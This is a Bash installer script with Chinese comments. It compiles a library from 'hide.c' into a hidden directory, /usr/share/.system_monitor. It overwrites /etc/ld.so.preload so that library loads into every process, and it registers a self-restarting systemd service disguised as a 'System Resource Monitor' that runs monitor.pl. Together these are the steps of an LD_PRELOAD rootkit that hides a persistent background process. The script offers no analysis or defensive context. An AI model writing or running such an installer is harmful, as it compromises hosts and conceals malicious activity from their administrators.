#!/bin/bash

# 检查root权限
if [ "$EUID" -ne 0 ]; then 
    echo "请使用root权限运行"
    exit 1
fi

# 检查并安装gcc
install_gcc() {
    if ! command -v gcc >/dev/null 2>&1; then
        echo "gcc未安装，正在安装..."
        # 检查系统类型
        if [ -f /etc/redhat-release ]; then
            # CentOS/RHEL系统
            yum -y install gcc gcc-c++ make
        elif [ -f /etc/debian_version ]; then
            # Debian/Ubuntu系统
            apt-get update
            apt-get -y install gcc g++ make
        else
            echo "不支持的系统类型，尝试使用预编译文件..."
            return 1
        fi
        
        # 验证安装结果
        if ! command -v gcc >/dev/null 2>&1; then
            echo "gcc安装失败，尝试使用预编译文件..."
            return 1
        else
            echo "gcc安装成功"
            return 0
        fi
    fi
    return 0
}

# 创建隐藏目录
HIDE_DIR="/usr/share/.system_monitor"
mkdir -p $HIDE_DIR

# 移除旧的preload
rm -f /etc/ld.so.preload

# 尝试安装gcc并编译，如果失败则使用预编译文件
if install_gcc; then
    # gcc安装成功，编译共享库
    echo "正在编译共享库..."
    gcc -std=c99 -shared -fPIC hide.c -o $HIDE_DIR/libsysmon.so -ldl
else
    # gcc安装失败，检查预编译文件
    if [ -f "./libsysmon.so" ]; then
        echo "使用预编译文件..."
        cp ./libsysmon.so $HIDE_DIR/
    else
        echo "错误：gcc安装失败且预编译文件libsysmon.so不存在"
        exit 1
    fi
fi

# 设置正确的权限
chmod 755 $HIDE_DIR/libsysmon.so
chown root:root $HIDE_DIR/libsysmon.so

# 复制监控脚本
cp monitor.pl $HIDE_DIR/
chmod +x $HIDE_DIR/monitor.pl

# 添加到preload
echo "$HIDE_DIR/libsysmon.so" > /etc/ld.so.preload
chmod 644 /etc/ld.so.preload

# 创建启动服务
cat > /etc/systemd/system/system-monitor.service << EOF
[Unit]
Description=System Resource Monitor Service
After=network.target

[Service]
Type=simple
Environment="LD_PRELOAD=$HIDE_DIR/libsysmon.so"
ExecStart=/usr/bin/perl $HIDE_DIR/monitor.pl
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# 启动服务
systemctl daemon-reload
systemctl enable system-monitor
systemctl restart system-monitor

echo "系统监控服务安装完成" 